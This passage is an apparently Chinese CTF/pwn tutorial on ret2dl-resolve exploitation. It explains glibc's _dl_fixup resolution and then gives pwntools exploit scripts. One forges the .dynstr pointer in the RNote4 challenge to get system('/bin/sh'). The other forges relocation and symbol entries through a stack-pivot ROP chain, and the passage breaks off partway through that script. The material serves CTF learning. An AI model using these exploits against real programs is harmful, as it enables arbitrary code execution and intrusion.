*l_ld;<span class="comment">/* 共享对象的动态部分 .dynamic  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* 后一个链和前一个链.*/</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We use this macro to refer to ELF types independent of the native wordsize.</span></span><br><span class="line"><span class="comment">   `ElfW(TYPE)' is used in place of `Elf32_TYPE' or `Elf64_TYPE'.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ElfW(type)_ElfW (Elf, __ELF_NATIVE_CLASS, type)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW(e,w,t)_ElfW_1 (e, w, _##t)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW_1(e,w,t)e##w##t</span></span><br></pre></td></tr></table></figure><p>_dl_fixup 在glibc/elf/dl-runtime.c<br>首先说第一个参数，是一个link_map的指针，它包含了.dynamic的指针，通过这个link_map，_dl_runtime_resolve函数可以访问到.dynamic这个section</p><p>而第二个参数，是当前要调用的导入函数在.rel.plt中的偏移（不过64位的话就直接是index下标），比方说这里，read就是0，__libc_start_main就是1*sizeof(Elf32_Rel)=8</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (  </span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS  </span><br><span class="line">    ELF_MACHINE_RUNTIME_FIXUP_ARGS,  </span><br><span class="line"># endif  </span><br><span class="line">    struct link_map *l, ElfW(Word) reloc_arg) &#123;  </span><br><span class="line">    <span class="comment">//获取symtab（存放dynsym的数组）  </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab  </span></span><br><span class="line"><span class="function">        </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//获取strtab(存放符号名的数组)   </span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的rel.plt项   </span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc  </span><br><span class="line">        = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的dynsym   </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;  </span><br><span class="line">    <span class="comment">//指向对应的got表，以便将解析结果写回去   </span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);  </span><br><span class="line">    <span class="keyword">lookup_t</span> result;  </span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Sanity check that we're really looking at a PLT relocation.  */</span>  </span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not </span></span><br><span class="line"><span class="comment">       used don't look in the global scope.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">            <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=  </span><br><span class="line">                (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);  </span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;  </span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  </span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)  </span><br><span class="line">                version = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is </span></span><br><span class="line"><span class="comment">        not necessary for objects which cannot be unloaded or when </span></span><br><span class="line"><span class="comment">         we are not using any threads (yet).  */</span>  </span><br><span class="line">        <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;  </span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();  </span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">        <span class="comment">//根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中   </span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,  </span><br><span class="line">                                      version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span>  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)  </span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//得到结果   </span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,  </span><br><span class="line">                                     sym ? (LOOKUP_VALUE_ADDRESS (result)  </span><br><span class="line">                                            + sym-&gt;st_value) : <span class="number">0</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span>  </span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span>  </span><br><span class="line">            &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))  </span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    <span class="comment">//将结果写回到got表中   </span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_dl_fixup函数</strong></p><ul><li>1 _dl_fixup函数首先通过宏D_PTR从用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针</li><li>2 rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel</li><li>3 rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym</li><li>4 .dynstr + sym-&gt;st_name得出符号名字符串指针</li><li>5 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表</li><li>6 调用这个函数</li></ul><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>那么，这个怎么去利用呢，有多种利用方式</p><h3 id="伪造-dynsym"><a href="#伪造-dynsym" class="headerlink" title="伪造 .dynsym"></a>伪造 .dynsym</h3><p>即使保护全没开 .dynsym也是不可写的，但可以<br>通过改写.dynamic的DT_STRTAB来伪造ELF String Table，也就是.dynsym<br>这个只有在checksec时No RELRO可行，即.dynamic可写。因为ret2dl-resolve会从.dynamic里面拿.dynstr字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个free函数，我们就把原本是free字符串的那个偏移位置设为system字符串，第一次调用free(“bin/sh”)（因为只有第一次才会resolve），就等于调用了system(“/bin/sh”)。</p><p>例题就是RCTF的RNote4，题目是一道堆溢出，NO RELRO而且NO PIE溢出到后面的指针可以实现任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 a1; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  a1 = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;a1, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !notes[a1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3 = notes[a1];</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);                      <span class="comment">// heap overflow堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( number &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  v3 = (note *)<span class="built_in">calloc</span>(<span class="number">0x10</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3-&gt;buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1u</span>LL); <span class="comment">//堆中存放了指针，所以可以通过这个任意写</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3-&gt;buf )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);</span><br><span class="line">  v3-&gt;size = size;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; notes[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  notes[i] = v3;</span><br><span class="line">  ++number;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以呢，可以先add两个note，然后编辑第一个note使得堆溢出到第二个note的指针，然后再修改第二个note，实现任意写。至于写什么，刚刚也说了，先写.dynamic指向字符串表的指针，使其指向一块可写内存，比如.bss，然后再写这块内存，使得相应偏移出刚好有个system\x00。exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">g_local=<span class="keyword">True</span></span><br><span class="line"><span class="comment">#e=ELF('./libc.so.6')</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">    sh =process(<span class="string">'./RNote4'</span>)<span class="comment">#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">"rnote4.2018.teamrois.cn"</span>, <span class="number">6767</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x01"</span>)</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span> <span class="keyword">and</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x02"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span></span><br><span class="line">    sh.send(<span class="string">"\x03"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#伪造的字符串表，(0x457-0x3f8)刚好是"free\x00"字符串的偏移</span></span><br><span class="line">payload = <span class="string">"C"</span> * (<span class="number">0x457</span><span class="number">-0x3f8</span>) + <span class="string">"system\x00"</span></span><br><span class="line"><span class="comment">#先新建两个notes</span></span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"B"</span> * <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#溢出时尽量保证堆块不被破坏，不过这里不会再做堆的操作了其实也无所谓</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x601EB0</span>))</span><br><span class="line"><span class="comment">#将0x601EB0，即.dynamic的字符串表指针，写成0x6020C8</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x6020C8</span>))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x6020C8</span>))</span><br><span class="line"><span class="comment">#在0x6020C8处写入伪造的字符串表</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#会第一次调用free，所以实际上是system("/bin/sh")被调用，如前面所说</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="伪造Elf32-Rel"><a href="#伪造Elf32-Rel" class="headerlink" title="伪造Elf32_Rel"></a>伪造Elf32_Rel</h3><p>通过操纵第二个参数，使其指向我们所构造的Elf32_Rel</p><p>当.dynamic不可写时，那么以上方法就没用了，所以有第二种利用方法<br> 上面我们讲完了函数的解析流程 主要是由dl_runtime_resolve(link_map,rel_offset),之所以它能解析不同函数的地址，以为我们传入的rel_offset不同，因此，把传入的rel_offset改为我们希望的函数的偏移，便可以执行我们希望的函数，新的问题来了，.rel.plt中不一定存在我们希望的函数，因此就需要我们伪造一个.rel.plt，将rel_offset修改为一个比较大的值，在.rel.plt+rel_offset的地方是我们伪造好的，结构跟.rel.plt相同的数据，这样我们就相当于伪造好了reloc（重定位入口），程序又会根据r_info找到对应的.dynsym中的symbols，我们再次伪造symbols的内容-&gt;st_name,使得到的str在我们的可控地址内，然后在.dynstr+st_name地址处放置库函数字符串例如：system。</p><p>所以，最终的利用思路，大概是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">0000000000400610</span> ; __unwind &#123;</span><br><span class="line">.plt:<span class="number">0000000000400610</span>                 push    cs:qword_602008</span><br><span class="line">.plt:<span class="number">0000000000400616</span>                 jmp     cs:qword_602010</span><br><span class="line">.plt:<span class="number">0000000000400616</span> sub_400610      endp</span><br></pre></td></tr></table></figure></p><p>构造ROP，跳转到resolve的PLT，push link_map的位置，就是上面所示的这个地方，也就是要调用_dl_runtime_resolve的地方,此时，栈中必须要有已经伪造好的指向伪造的Elf32_Rel的偏移</p><p>伪造一个很大的rel_offset，一直偏移到bss段（一般这里可读可写，且位于.rel.plt的高地址）</p><p>伪造Elf32_Rel即.rel.plt的结构,由RELSZ可知，它的大小为8字节（commend: readelf -d fun 可以看到），我们需要fake r_offset,以及r_info，r_offset一般是函数在.got.plt的地址，r_info可以用来计算在symtab中的index并且保存了类型，所以我们可以让伪造的symtab的数据紧跟在这段数据后面，这样我们就可以计算出它的index: index=(bss+0×100-.dynsym)/0×10(因为SYMENT指明大小为16字节)，类型必须为7，所以我们就可以计算出r_info的值<br>r_info=(index &lt;&lt; 8 ) | 0x7</p><p>伪造symtab，这一部分包含四个字段，我们只需要改st_name部分即可，其余部分按照程序原有的值赋值，st_name表示了字符串相对strtab的偏移，我们可以将字符串写在紧邻这一部分的高地址处</p><p>伪造strtab，这里我们直接将所需库函数的字符串写入即可，例如system<br>dl_runtime_resolve函数便会将system函数的地址，写到read函数对应的got表中去，再次调用read就相当于调用了system函数</p><p>利用思路如下:</p><p>第一次调用read函数，返回地址再溢出成read函数，这次参数给一个.bss的地址，里面放我们的payload，包括所有伪造的数据结构以及ROP。注意ROP要放在数据结构的前面，不然ROP调用时有可能污染我们伪造的数据结构，而且前面要预留一段空间给ROP所调用的函数用。调用完第二个read之后，ROP到leave; retn的地址，以便切栈切到在.bss中我们构造的下一个ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x2C</span> </span><br><span class="line">payload1 += p32(pop_ebp_ret) + p32(bss + <span class="number">0x800</span>) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_stage) + p32(<span class="number">0x1000</span>)</span><br><span class="line">sh.send(payload1)</span><br></pre></td></tr></table></figure><p>第二次调用read函数，此时要sendROP链以及所有相关的伪造数据结构完整的exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./fun'</span>)</span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080484ab</span></span><br><span class="line">leave_ret=<span class="number">0x08048378</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_stack_size=<span class="number">0x800</span></span><br><span class="line">bss=<span class="number">0x0804a01c</span></span><br><span class="line">read_plt=<span class="number">0x080482e0</span></span><br><span class="line">read_got=<span class="number">0x0804a00c</span></span><br><span class="line">bss_stage=bss+fake_stack_size</span><br><span class="line">dynsym=<span class="number">0x080481cc</span></span><br><span class="line">dynstr=<span class="number">0x0804821c</span></span><br><span class="line">dl_runtime_resolve=<span class="number">0x080482d0</span></span><br><span class="line">relplt=<span class="number">0x08048298</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rel_offset=bss_stage+<span class="number">28</span>-relplt</span><br><span class="line">fake_sym_addr=bss_stage+<span class="number">36</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>) <span class="comment">#为了16字节对齐</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'align==&gt;'</span>+hex(align)</span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line">index=(fake_sym_addr-dynsym)/<span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'index==&gt;'</span>+hex(index)</span><br><span class="line">r_info=(index&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'r_info==&gt;'</span>+hex(r_info)</span><br><span class="line"></span><br><span class="line">fake_raloc=p32(read_got)+p32(r_info)</span><br><span class="line">st_name=fake_sym_addr-dynstr+<span class="number">16</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x2C</span> </span><br><span class="line">payload1 += p32(pop_ebp_ret) + p32(bss + <span class="number">0x800</span>) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_stage) + p32(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">binsh=<span class="string">'/bin/sh'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'aaaa'</span></span><br><span class="line">payload+=p32(dl_runtime_resolve)</span><br><span class="line">payload+=p32(rel_offset)</span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=p32(bss_stage+<span class="number">80</span>)</span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span 